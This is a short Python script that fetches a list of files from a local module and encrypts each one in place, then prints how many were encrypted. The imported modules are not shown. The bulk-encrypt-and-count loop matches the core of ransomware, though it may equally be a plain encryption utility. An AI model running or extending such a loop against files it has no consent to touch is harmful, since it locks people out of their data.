import main, cryptograph

files = main.files_list()
for file in files:
	cryptograph.crypt(file, encrypted = True)
print("%s files has been encrypted" %len(files))